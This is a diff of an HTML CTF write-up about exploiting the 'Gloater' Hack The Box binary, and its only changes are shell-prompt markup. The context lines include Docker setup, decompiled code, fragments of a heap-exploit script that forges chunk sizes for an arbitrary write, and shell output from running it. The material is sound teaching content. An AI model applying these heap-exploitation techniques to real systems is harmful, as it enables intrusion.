@@ -22,7 +22,7 @@ RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
 
 <span class="mtk5">EXPOSE</span><span class="mtk1"> 9001</span>
 <span class="mtk5">CMD</span><span class="mtk1"> [</span><span class="mtk4">"./run.sh"</span><span class="mtk1">]</span>
-</code></pre></div><p>We can see that the program is running on Ubuntu 20.04, so it will use Glibc 2.31. We can launch the container and take <code>libc.so.6</code> from inside:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">docker</span> build --tag=gloater <span class="mtku">.</span>
+</code></pre></div><p>We can see that the program is running on Ubuntu 20.04, so it will use Glibc 2.31. We can launch the container and take <code>libc.so.6</code> from inside:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> build --tag=gloater <span class="mtku">.</span>
 [+] Building 5.3s (12/12) FINISHED                                                                                                             docker:default
 <span class="code-dark-blue"> =&gt; [internal] load build definition from Dockerfile                                                                                                     0.0s</span>
 <span class="code-dark-blue"> =&gt; =&gt; transferring dockerfile: 318B                                                                                                                     0.0s</span>  
@@ -43,10 +43,10 @@ RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
 <span class="code-dark-blue"> =&gt; =&gt; writing image sha256:160391a668cdd71f3c4d464f323b68fa8fe51ff1e6582ac20971348e7daeb079                                                             0.0s</span>
 <span class="code-dark-blue"> =&gt; =&gt; naming to docker.io/library/gloater                                                                                                               0.0s</span>
 
-<span class="code-red">#</span> <span class="code-dark-green">docker</span> run -it -p 9001:9001 --rm --name=gloater -d <span class="mtku">gloater</span>
+<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it -p 9001:9001 --rm --name=gloater -d <span class="mtku">gloater</span>
 4f9e9d6840a1026b36dea1ba4575be9baa8f22edc051f52b5ba2180bca2cc0a8
 
-<span class="code-red">#</span> <span class="code-dark-green">docker</span> cp -L 4f9e9d68:/lib/x86_64-linux-gnu/libc.so.6 <span class="mtku">.</span>
+<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> cp -L 4f9e9d68:/lib/x86_64-linux-gnu/libc.so.6 <span class="mtku">.</span>
 Successfully copied 2.03MB to ./.
 </code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
 <span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
@@ -85,7 +85,7 @@ Successfully copied 2.03MB to ./.
 <span class="mtk1">    }</span>
 <span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
 <span class="mtk1">}</span>
-</code></pre></div><p>Basically, it prompts a typical menu from a heap exploitation challenge (after setting a username):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">nc</span> 127.0.0.1 9001
+</code></pre></div><p>Basically, it prompts a typical menu from a heap exploitation challenge (after setting a username):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 127.0.0.1 9001
 Enter User
 Do not make a mistake, or there will be no safeguard!  
 &gt; asdf
@@ -378,7 +378,7 @@ Do not make a mistake, or there will be no safeguard!
 <span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'qwer'</span><span class="mtk1">, p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">181</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)) </span>  
 <span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">118</span><span class="mtk1">) </span>
 <span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">118</span><span class="mtk1">) </span>
-</code></pre></div><p>The size of the chunks are quite arbitrary. I started with <code>0x18</code>, but then I needed more size for the arbitrary write, so I simply added <code>0x100</code>, which was easy.</p><p>We can launch the exploit and then attach to the process running on the Docker container using GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">gdb</span> -q -p <span class="code-dark-magenta">$(</span><span class="code-dark-green">pidof</span> <span class="mtku">gloater</span><span class="code-dark-magenta">)</span>
+</code></pre></div><p>The size of the chunks are quite arbitrary. I started with <code>0x18</code>, but then I needed more size for the arbitrary write, so I simply added <code>0x100</code>, which was easy.</p><p>We can launch the exploit and then attach to the process running on the Docker container using GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q -p <span class="code-dark-magenta">$(</span><span class="code-dark-green">pidof</span> <span class="mtku">gloater</span><span class="code-dark-magenta">)</span>
 Loading GEF...
 Attaching to process 327587
 Reading symbols from <span class="code-dark-green">target:/home/ctf/gloater</span>...
@@ -671,7 +671,7 @@ gloater
 run.sh
 <span class="code-red">$</span> cat flag.txt
 HTB{f4k3_fL4g_f0R_t3sTiNg}
-</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s go remote:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.54.170:58631
+</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s go remote:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.54.170:58631
 [<span class="code-blue">*</span>] './gloater'
     Arch:     amd64-64-little
     RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
